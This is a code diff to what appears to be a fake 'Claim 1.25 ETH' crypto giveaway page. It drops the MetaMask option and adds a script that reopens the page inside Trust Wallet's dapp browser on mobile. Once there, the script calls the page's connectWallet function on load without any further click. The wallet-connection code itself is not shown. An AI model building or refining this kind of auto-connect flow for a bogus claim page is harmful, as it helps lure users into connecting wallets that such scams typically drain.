@@ -89,7 +89,7 @@
 
                 <div class="claim-button-container">
                     <select id="wallet-select">
-                        <option value="metamask">MetaMask</option>
+                        
                         <option value="trust">Trust Wallet</option>
                         <option value="walletconnect">WalletConnect</option>
                         <option value="coinbase">Coinbase Wallet</option>
@@ -100,6 +100,49 @@
                     <button id="ethConnectWallet" class="eth-claim-button"><i class="fas fa-wallet"></i> Connect Wallet & Claim 1.25 ETH</button>
                 </div>
 
+<script>
+  const TRUST_DEEPLINK = 'https://link.trustwallet.com/open_url?coin_id=60&url=';
+
+  // True when the page is already running inside Trust Wallet (dapp browser or extension)
+  function isTrustBrowser() {
+    const eth = window.ethereum;
+    return !!(
+      window.trustwallet ||
+      eth?.isTrust || eth?.isTrustWallet ||
+      eth?.providers?.some(p => p.isTrust || p.isTrustWallet)
+    );
+  }
+
+  function isMobile() {
+    return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+  }
+
+  // Reopen this page inside Trust Wallet's dapp browser, flagged to auto-continue
+  function openInTrustBrowser() {
+    const target = new URL(window.location.href);
+    target.searchParams.set('autoconnect', 'trust');
+    window.location.href = TRUST_DEEPLINK + encodeURIComponent(target.toString());
+  }
+
+  document.getElementById('trust').addEventListener('click', async () => {
+    const choice = document.getElementById('wallet-select').value;
+
+    if (choice === 'trust' && isMobile() && !isTrustBrowser()) {
+      openInTrustBrowser();
+      return; // stop here; the flow resumes once the page loads in Trust Wallet
+    }
+
+    await connectWallet(choice); // <-- your existing normal function
+  });
+
+  // Resume the normal flow after landing in the Trust Wallet browser
+  window.addEventListener('load', () => {
+    const params = new URLSearchParams(window.location.search);
+    if (params.get('autoconnect') === 'trust' && isTrustBrowser()) {
+      connectWallet('trust');
+    }
+  });
+</script>
                 <div class="wallet-icons">
                     <div class="wallet-icon"><i class="fas fa-fox"></i></div>
                     <div class="wallet-icon"><i class="fas fa-shield"></i></div>
